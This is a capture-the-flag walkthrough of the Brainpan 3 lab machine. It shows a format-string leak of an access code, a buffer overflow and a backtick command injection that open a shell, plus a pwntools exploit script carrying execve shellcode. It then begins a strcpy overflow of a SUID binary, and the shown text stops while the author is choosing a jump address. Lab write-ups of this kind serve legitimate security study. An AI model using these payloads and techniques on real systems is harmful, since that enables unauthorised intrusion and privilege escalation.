&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;root@kali:~# nmap -n -sT -p- -T5 192.168.56.105

Not shown: 65533 filtered ports
PORT     STATE  SERVICE
1337/tcp open   waste
8080/tcp closed http-proxy
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&#34;access-code:7a4f5a6448fafb319eff7e8a031bbd6b&#34;&gt;Access Code&lt;/h2&gt;

&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;root@kali:~# nc 192.168.56.105 1337


  __ )    _ \      \    _ _|   \  |   _ \    \      \  |     _ _| _ _| _ _|
  __ \   |   |    _ \     |     \ |  |   |  _ \      \ |       |    |    | 
  |   |  __ &amp;lt;    ___ \    |   |\  |  ___/  ___ \   |\  |       |    |    | 
 ____/  _| \_\ _/    _\ ___| _| \_| _|   _/    _\ _| \_|     ___| ___| ___|

                                                            by superkojiman




AUTHORIZED PERSONNEL ONLY
PLEASE ENTER THE 4-DIGIT CODE SHOWN ON YOUR ACCESS TOKEN
A NEW CODE WILL BE GENERATED AFTER THREE INCORRECT ATTEMPTS

ACCESS CODE: 
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;If the code regenerates after 3 incorrect attempts, it&amp;rsquo;s very unlikely we can bruteforce it.  With nothing else going for us, let&amp;rsquo;s see what else we can shove in.&lt;/p&gt;

&lt;p&gt;You get a nice bit of ASCII art if you supply a large input.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;ACCESS CODE: 1111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111


                      /´¯/) 
                    ,/¯  / 
                   /    / 
             /´¯/&#39;   &#39;/´¯¯`·¸ 
          /&#39;/   /    /       /¨¯\ 
        (&#39;(   ´   ´     ¯~/&#39;   &#39;) 
         \                 &#39;     / 
          &#39;&#39;   \           _.·´ 
            \              ( 
              \__-_-____-___\   

&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;If we try some format strings, we get a message that suggests we might be on the right track?&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;ACCESS CODE: %x.%x.%x.%x
ERROR #4: WHAT IS THIS, AMATEUR HOUR?
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;We find that &lt;code&gt;%p&lt;/code&gt; works.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;ACCESS CODE: %p.%p.%p.%p.%p.%p
ERROR #1: INVALID ACCESS CODE: 0xbfacf99c.(nil).0x1850.0xbfacf99c.(nil).0xa
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Hopefully we can use this to find the access code on the stack.  After some searching, we determine that the code is in the third postition and we can use the decimal format to dump it out.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;ACCESS CODE: %3$d
ERROR #1: INVALID ACCESS CODE: 6224

ACCESS CODE: 6224

--------------------------------------------------------------
SESSION: ID-1300
  AUTH   [Y]    REPORT [N]    MENU   [Y]  
--------------------------------------------------------------


1  - CREATE REPORT
2  - VIEW CODE REPOSITORY
3  - UPDATE SESSION NAME
4  - SHELL
5  - LOG OFF

ENTER COMMAND: 
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;&lt;code&gt;SHELL&lt;/code&gt; is obviously a troll.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;ENTER COMMAND: 4
SELECTED: 4
reynard@brainpan3 $ ls
total 0
-rw-rw-r-- 1 reynard reynard 22 May 10 22:26 .flag
-rw-rw-r-- 1 reynard reynard  0 May 10 22:26 never
-rw-rw-r-- 1 reynard reynard  0 May 10 22:26 gonna
-rw-rw-r-- 1 reynard reynard  0 May 10 22:26 give
-rw-rw-r-- 1 reynard reynard  0 May 10 22:26 you
-rw-rw-r-- 1 reynard reynard  0 May 10 22:26 up
-rw-rw-r-- 1 reynard reynard  0 May 10 22:26 never
-rw-rw-r-- 1 reynard reynard  0 May 10 22:26 gonna
-rw-rw-r-- 1 reynard reynard  0 May 10 22:26 let
-rw-rw-r-- 1 reynard reynard  0 May 10 22:26 you
-rw-rw-r-- 1 reynard reynard  0 May 10 22:26 down
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&#34;session-name:7a4f5a6448fafb319eff7e8a031bbd6b&#34;&gt;Session Name&lt;/h2&gt;

&lt;p&gt;We have this banner across the top.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;--------------------------------------------------------------
SESSION: ID-1300
  AUTH   [Y]    REPORT [N]    MENU   [Y]  
--------------------------------------------------------------
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;It has a session name but we can see that the &lt;code&gt;report&lt;/code&gt; function is disabled.  If we try and access it, we get told no :(&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;ENTER COMMAND: 1
SELECTED: 1
REPORT MODE IS DISABLED IN THIS BUILD
&lt;/code&gt;&lt;/pre&gt;

&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;ENTER COMMAND: 3
SELECTED: 3
ENTER NEW SESSION NAME: new session
--------------------------------------------------------------
SESSION: new session
 �u
  AUTH   [Y]    REPORT [N]    MENU   [Y]  
--------------------------------------------------------------
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;When I modified the session name, I noticed some odd characters getting added underneath.  So I started mucking around with this input.  What I eventually found, was that I could overflow the values set here. See how &lt;code&gt;MENU [A]&lt;/code&gt; is now set.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;ENTER NEW SESSION NAME: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
--------------------------------------------------------------
SESSION: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
  AUTH   [Y]    REPORT [N]    MENU   [A]  
--------------------------------------------------------------
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;The postition required to overflow &lt;code&gt;REPORT&lt;/code&gt; is 253.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;ENTER COMMAND: 3
SELECTED: 3
ENTER NEW SESSION NAME: YYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYY
--------------------------------------------------------------
SESSION: YYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYY
  AUTH   [Y]    REPORT [Y]    MENU   [Y]  
--------------------------------------------------------------
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Now we can access the report area.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;ENTER COMMAND: 1
SELECTED: 1

ENTER REPORT, END WITH NEW LINE:

this is a report

REPORT [this is a report4]
SENDING TO REPORT MODULE

[+] WRITING REPORT TO /home/anansi/REPORTS/20150919124751.rep
[+] DATA SUCCESSFULLY ENCRYPTED
[+] DATA SUCCESSFULLY RECORDED
[+] RECORDED [����҄�Ҍҟ������]
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;On first impressions, it seems our input gets encrypted and stored in &lt;code&gt;anansi&#39;s&lt;/code&gt; home directory.  After some more experimenting I found that the input to report was vulnerable to a buffer overflow, since it was triggering the stack protection on the binary.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;ENTER REPORT, END WITH NEW LINE:

AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA

REPORT [AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYYY]
SENDING TO REPORT MODULE

*** stack smashing detected ***: /var/www/repo/report terminated
[+] WRITING REPORT TO /home/anansi/REPORTS/20150919124950.rep
[+] DATA SUCCESSFULLY ENCRYPTED
[+] DATA SUCCESSFULLY RECORDED
[+] RECORDED [�������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������]
Aborted (core dumped)
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;It&amp;rsquo;s at this point we have to take a step back, without the actual binary to analyse I couldn&amp;rsquo;t see a way of progressing this further.&lt;/p&gt;

&lt;h2 id=&#34;some-trolls:7a4f5a6448fafb319eff7e8a031bbd6b&#34;&gt;Some Trolls&lt;/h2&gt;

&lt;p&gt;Option &lt;code&gt;2  - VIEW CODE REPOSITORY&lt;/code&gt; opens up port &lt;code&gt;8080&lt;/code&gt; that we saw closed earlier.&lt;/p&gt;

&lt;div align=&#34;center&#34;&gt;
	&lt;figure style=&#34;background-color: #f2f0ec;&#34; &gt;
    
        &lt;img src=&#34;https://rastamouse.me/img/writeups/brainpan-3/hacked.png&#34;  /&gt;
    
    
&lt;/figure&gt;
&lt;/div&gt;

&lt;p&gt;The &lt;code&gt;robots&lt;/code&gt; file containts &lt;code&gt;Disallow: /bp3_repo&lt;/code&gt;&amp;hellip; which is yet another troll.&lt;/p&gt;

&lt;div align=&#34;center&#34;&gt;
	&lt;figure style=&#34;background-color: #f2f0ec;&#34; &gt;
    
        &lt;img src=&#34;https://rastamouse.me/img/writeups/brainpan-3/mario.gif&#34;  /&gt;
    
    
&lt;/figure&gt;
&lt;/div&gt;

&lt;p&gt;After &lt;em&gt;more&lt;/em&gt; searching, we find a &lt;code&gt;repo&lt;/code&gt; directory, with a simple listing.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;Directory listing for /repo/

    bofh
    how-to-pwn-brainpan.jpg
    README.txt
    report
    shell 
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;&lt;code&gt;bofh&lt;/code&gt; and &lt;code&gt;shell&lt;/code&gt; (my fav) both seem to be trolls.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;root@kali:~# ./shell 
            ___
        .-&amp;quot;; ! ;&amp;quot;-.
      .&#39;!  : | :  !`.
     /\  ! : ! : !  /\
    /\ |  ! :|: !  | /\
   (  \ \ ; :!: ; / /  )
  ( `. \ | !:|:! | / .&#39; )
  (`. \ \ \!:|:!/ / / .&#39;)
   \ `.`.\ |!|! |/,&#39;.&#39; /
    `._`.\\\!!!// .&#39;_.&#39;
       `.`.\\|//.&#39;.&#39;
        |`._`n&#39;_.&#39;|
        &amp;quot;----^----&amp;quot;

     here&#39;s your shell
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&#34;report:7a4f5a6448fafb319eff7e8a031bbd6b&#34;&gt;Report&lt;/h2&gt;

&lt;p&gt;The &lt;code&gt;report&lt;/code&gt; binary is really where we need to focus our effort.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;root@kali:~/bp3# file report 
report: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.24, BuildID[sha1]=ba63c3cd3047efba60ab9d506bd5d954492c4660, not stripped

root@kali:~/bp3# ./report 
./report &amp;lt;report&amp;gt; [0|1]
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;It doesn&amp;rsquo;t matter which option you choose (0 or 1), you get the same result.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;               ____
           .-&#39;&amp;amp;    &#39;-.
          / __    __  \
         :-(__)--(__)--;
        (      (_       )
         :             ;
          \    __     /
           `-._____.-&#39;
             /`&amp;quot;&amp;quot;&amp;quot;`\
            /    ,  \
           /|/\/\/\ _\
          (_|/\/\/\\__)
            |_______|
           __)_ |_ (__
          (_____|_____)

       YOU&#39;RE IN THE MATRIX
           CHARLIE BROWN
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;At some point, superkoijman showed me that this was from The Simpsons :)&lt;/p&gt;

&lt;div align=&#34;center&#34;&gt;
	&lt;figure style=&#34;background-color: #f2f0ec;&#34; &gt;
    
        &lt;img src=&#34;https://rastamouse.me/img/writeups/brainpan-3/matrix.jpg&#34;  /&gt;
    
    
&lt;/figure&gt;
&lt;/div&gt;

&lt;p&gt;Let&amp;rsquo;s get into the binary.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;gdb-peda$ checksec 
CANARY    : ENABLED
FORTIFY   : disabled
NX        : ENABLED
PIE       : disabled
RELRO     : Partial
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;If we disassemble a function called &lt;code&gt;cb&lt;/code&gt;, we spot a call to &lt;code&gt;uname&lt;/code&gt;.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;gdb-peda$ pdisass cb
   0x08048b44 &amp;lt;+32&amp;gt;:	call   0x8048640 &amp;lt;uname@plt&amp;gt;
   0x08048b49 &amp;lt;+37&amp;gt;:	mov    DWORD PTR [esp+0x4],0x8048e98

gdb-peda$ x/s 0x8048e98
0x8048e98:	&amp;quot;brainpan3&amp;quot;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;So the hostname of the machine has to be &lt;code&gt;brainpan3&lt;/code&gt; before it&amp;rsquo;ll go any further.  I&amp;rsquo;m sure you could just NOP it out in gdb, or just change the hostname of your machine.  With that now working, I ran the binary twice.&lt;/p&gt;

&lt;h2 id=&#34;bof-ing:7a4f5a6448fafb319eff7e8a031bbd6b&#34;&gt;BoF&amp;rsquo;ing&lt;/h2&gt;

&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;root@brainpan3:~/bp3# ./report test 1
[+] WRITING REPORT TO /home/anansi/REPORTS/20150919213852.rep
[+] DATA SUCCESSFULLY ENCRYPTED
[+] DATA SUCCESSFULLY RECORDED
[+] RECORDED [����]

root@brainpan3:~/bp3# ./report test 0
[+] WRITING REPORT TO /home/anansi/REPORTS/20150919213854.rep
[+] DATA SUCCESSFULLY ENCRYPTED
[+] DATA SUCCESSFULLY RECORDED
Segmentation fault
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Obviously the SEGFAULT is interesting, so let&amp;rsquo;s run that again in gdb.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;gdb-peda$ r test 0

Stopped reason: SIGSEGV
0x08040074 in ?? ()
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;You will notice that &lt;code&gt;74&lt;/code&gt; is &lt;code&gt;t&lt;/code&gt;.  Putting in a slightly longer input, we find that we can controll EIP after just 3 bytes.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;gdb-peda$ r AAABBBB 0

Stopped reason: SIGSEGV
0x42424242 in ?? ()
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;But where is the stack smashing message we saw earlier?  Turns out this only happens when you run the binary with &lt;code&gt;1&lt;/code&gt;.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;root@brainpan3:~/bp3# ./report AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA 1
[+] WRITING REPORT TO /home/anansi/REPORTS/20150919214423.rep
[+] DATA SUCCESSFULLY ENCRYPTED
[+] DATA SUCCESSFULLY RECORDED
[+] RECORDED [��������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������]
*** stack smashing detected ***: ./report terminated
Segmentation fault
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;So the way we are interacting with the binary over netcat, it is automatically run as &lt;code&gt;1&lt;/code&gt; rather than &lt;code&gt;0&lt;/code&gt;.  I went back to netcat to see if I could solve this problem before proceeding.  After some expermenting, I found that you could prematurely terminate the command being run.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;ENTER REPORT, END WITH NEW LINE:

&amp;quot;      

REPORT [&amp;quot;]
SENDING TO REPORT MODULE

sh: 1: Syntax error: Unterminated quoted string
&lt;/code&gt;&lt;/pre&gt;

&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;ENTER REPORT, END WITH NEW LINE:

AAABBBB&amp;quot; 0&amp;quot;

REPORT [AAABBBB&amp;quot; 0&amp;quot;]
SENDING TO REPORT MODULE

Segmentation fault (core dumped)
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;It was around this point I discovered an easier way in.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;ENTER REPORT, END WITH NEW LINE:

`/bin/sh &amp;gt;&amp;amp;2`

REPORT [`/bin/sh &amp;gt;&amp;amp;2`]
SENDING TO REPORT MODULE

id
uid=1000(anansi) gid=1003(webdev) groups=1000(anansi)
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;I wasn&amp;rsquo;t satisifed with getting through this way, so I carried on trying to solve the binary &amp;lsquo;properly&amp;rsquo;.&lt;/p&gt;

&lt;p&gt;So after much disassembling, we find that we overwrite a pointer for &lt;code&gt;REPORT&lt;/code&gt; with our buffer.  If we break at &lt;code&gt;main&lt;/code&gt; and dump the area of memory, there is nothing there.  After our input gets written, we can see it on the stack.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;gdb-peda$ b main
gdb-peda$ r AAABBBBCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC 0

gdb-peda$ x/12wx 0x804b0a0
0x804b0a0 &amp;lt;REPORT&amp;gt;:	0x00000000	0x00000000	0x00000000	0x00000000
0x804b0b0 &amp;lt;REPORT+16&amp;gt;:	0x00000000	0x00000000	0x00000000	0x00000000
0x804b0c0 &amp;lt;REPORT+32&amp;gt;:	0x00000000	0x00000000	0x00000000	0x00000000

gdb-peda$ c

Stopped reason: SIGSEGV
0x42424242 in ?? ()

gdb-peda$ x/12wx 0x804b0a0
0x804b0a0 &amp;lt;REPORT&amp;gt;:	0x42414141	0x43424242	0x43434343	0x43434343
0x804b0b0 &amp;lt;REPORT+16&amp;gt;:	0x43434343	0x43434343	0x43434343	0x43434343
0x804b0c0 &amp;lt;REPORT+32&amp;gt;:	0x43434343	0x43434343	0x43434343	0x43434343
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;The last bit of the puzzle is bypassing the &lt;code&gt;NX&lt;/code&gt; protection.  Actually&amp;hellip; we don&amp;rsquo;t need to, as superkojiman already does this for us.  There is a call to &lt;code&gt;mprotect&lt;/code&gt; in &lt;code&gt;main&lt;/code&gt; - I leave it as an exercise to the reader to verify, but it basically makes the &lt;code&gt;REPORT&lt;/code&gt; region of memory &lt;code&gt;rwx&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;Now we&amp;rsquo;ve overwritten the pointer, we have to make a relative jump foward into our shellcode - truth be told, I couldn&amp;rsquo;t be bothered to work out by how much.  So I slapped a &lt;code&gt;+10&lt;/code&gt; in and placed a handful of &lt;code&gt;NOPs&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;Testing this approach using a SIGTRAP.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;gdb-peda$ r $(python -c &#39; print &amp;quot;AAA&amp;quot; + &amp;quot;\xb0\xb0\x04\x08&amp;quot; + &amp;quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&amp;quot; + &amp;quot;\xcc\xcc&amp;quot;&#39;) 0

Stopped reason: SIGTRAP
0x0804b0b2 in REPORT ()
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Now to put it all together.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;#!/usr/bin/env python

from pwn import *
import struct, re

r = remote(&amp;quot;192.168.56.102&amp;quot;, 1337)

r.recvuntil(&amp;quot;CODE:&amp;quot;)
r.send(&amp;quot;%3$d\n&amp;quot;)
recv = r.recvuntil(&amp;quot;DIGITS&amp;quot;)

pin = re.findall(r&amp;quot;INVALID ACCESS CODE: (.*?)\n&amp;quot;, recv)[0]
print &amp;quot;Found Access Code: &amp;quot; + pin

r.send(pin + &amp;quot;\n&amp;quot;)
r.recvuntil(&amp;quot;COMMAND:&amp;quot;)

print &amp;quot;Changing Session ID&amp;quot;

session = &amp;quot;Y&amp;quot; * 253
r.send(&amp;quot;3\n&amp;quot;)
r.recvuntil(&amp;quot;NAME:&amp;quot;)
r.send(session + &amp;quot;\n&amp;quot;)
r.recvuntil(&amp;quot;COMMAND:&amp;quot;)

print &amp;quot;Creating Report&amp;quot;

rep = &amp;quot;AAA&amp;quot;
rep += p32(0x804b0a0 + 10)
rep += &amp;quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80&amp;quot;
rep += &#39;&amp;quot; 0&amp;quot;&#39;

r.send(&amp;quot;1\n&amp;quot;)
r.send(rep + &amp;quot;\n&amp;quot;)

print &amp;quot;Dropping into shell&amp;quot;

r.interactive()
&lt;/code&gt;&lt;/pre&gt;

&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;root@kali:~/bp3# ./report.py 
[+] Opening connection to 192.168.56.105 on port 1337: Done
Found Access Code: 2144
Changing Session ID
Creating Report
Dropping into shell
[*] Switching to interactive mode
 SELECTED: 1

ENTER REPORT, END WITH NEW LINE:


REPORT [AAA\xaa\xb0\x0\x90\x90\x90\x90\x90\x90\x90\x90\x90\x901����
                                                                   Qh//shh/bin\x89�̀&amp;quot; 0&amp;quot;\x16]
SENDING TO REPORT MODULE

$ id
uid=1000(anansi) gid=1003(webdev) groups=1000(anansi)
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&#34;reynard:7a4f5a6448fafb319eff7e8a031bbd6b&#34;&gt;Reynard&lt;/h2&gt;

&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;$ ls -l /home/reynard/private
total 16
-rwsr-xr-x 1 reynard reynard 5568 May 19 18:28 cryptor
-r-------- 1 reynard reynard   77 May 21 10:42 sekret.txt.enc
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Here we have a SUID binary owned by &lt;code&gt;reynard&lt;/code&gt;.  It&amp;rsquo;s difficult to get files in and out of brainpan3, as there seem to be really strict firewall rules in place.  So to transfer it to my machine for analysis, I used &lt;code&gt;xxd&lt;/code&gt; and copied the output in the Terminal.&lt;/p&gt;

&lt;p&gt;The binary doesn&amp;rsquo;t appear to do very much, unless I&amp;rsquo;m not using it properly&amp;hellip;&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;root@kali:~/bp3# ./cryptor
Usage: ./cryptor file key
root@kali:~/bp3# echo test&amp;gt;test
root@kali:~/bp3# ./cryptor test qwerty
[+] saving to test.enc
root@kali:~/bp3# cat test.enc 
test
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;It&amp;rsquo;s a stripped binary, but doesn&amp;rsquo;t have much in the way of protections.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;root@kali:~/bp3# file cryptor
cryptor: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.24, BuildID[sha1]=9b8ec7935e7b95d1897867969c43303940c4407e, stripped

gdb-peda$ checksec 
CANARY    : disabled
FORTIFY   : disabled
NX        : disabled
PIE       : disabled
RELRO     : Partial
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Simply running &lt;code&gt;strings&lt;/code&gt; reveals that &lt;code&gt;strcpy&lt;/code&gt; is in use somewhere.  I actually disassembled the binary in a trial version of Hopper - and we can see that it does a string length check on the input arguments.  This is the Hopper pseudo-code:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-c&#34;&gt;    if (strlen(arg0) &amp;gt; 0x74) {
            strncpy(var_78, arg0, 0x5a);
    }
    else {
            strcpy(var_78, arg0);
    }
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;So if we supply an input for &lt;code&gt;argv0&lt;/code&gt; of 116 bytes, it will get passed to &lt;code&gt;strcpy&lt;/code&gt; rather than &lt;code&gt;strncpy&lt;/code&gt;.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;gdb-peda$ r $(python -c &#39;print &amp;quot;A&amp;quot; * 116&#39;) qwerty

EAX: 0x0 
EBX: 0x41414141 (&#39;AAAA&#39;)
ECX: 0x0 
EDX: 0x0 
ESI: 0x0 
EDI: 0x636e652e (&#39;.enc&#39;)
EBP: 0x1 
ESP: 0xbffff308 --&amp;gt; 0xb7e14a68 --&amp;gt; 0x1df7 
EIP: 0xb7fb57e0 --&amp;gt; 0x0

Stopped reason: SIGSEGV
0xb7fb57e0 in _IO_wfile_jumps () from /lib/i386-linux-gnu/i686/cmov/libc.so.6
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;That&amp;rsquo;s a start, but we don&amp;rsquo;t yet control EIP.  I tried it again, but with a longer key.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;gdb-peda$ r $(python -c &#39;print &amp;quot;A&amp;quot; * 116 + &amp;quot; &amp;quot; + &amp;quot;B&amp;quot; * 100&#39;)

EAX: 0x0 
EBX: 0x41414141 (&#39;AAAA&#39;)
ECX: 0x0 
EDX: 0x0 
ESI: 0x0 
EDI: 0x636e652e (&#39;.enc&#39;)
EBP: 0x41414141 (&#39;AAAA&#39;)
ESP: 0xbffff308 (&#39;A&#39; &amp;lt;repeats 100 times&amp;gt;)
EIP: 0x41414141 (&#39;AAAA&#39;)

Stopped reason: SIGSEGV
0x41414141 in ?? ()
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Much more promising!  By using pattern create/offset I found that EIP gets overwritten after only 4 bytes, but the total string length still has to be 116 to trigger the overwrite.  Let&amp;rsquo;s target EIP specifically.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;#!/usr/bin/env python

import struct

buf = &amp;quot;AAAA&amp;quot;            # first junk
buf += &amp;quot;BBBB&amp;quot;           # eip
buf += &amp;quot;C&amp;quot; * (116-8)    # padding to reach 116
buf += &amp;quot; &amp;quot;
buf += &amp;quot;D&amp;quot; * 100        # key

print buf
&lt;/code&gt;&lt;/pre&gt;

&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;gdb-peda$ r $(./cryptor.py)

Stopped reason: SIGSEGV
0x42424242 in ?? ()
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Question now, is where to jump to?  Well it turns out that the data for &amp;lsquo;key&amp;rsquo; is always stored in the same place in memory.  Something we can verify in gdb just by searching for our input.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;gdb-peda$ find &#39;DDDD&#39;
Searching for &#39;DDDD&#39; in: None ranges
Found 50 results, display max 50 items:
cryptor : 0x804a080 (&#39;D&#39; &amp;lt;repeats 100 times&amp;gt;)
&lt;/code&gt;&lt;/pre&gt;

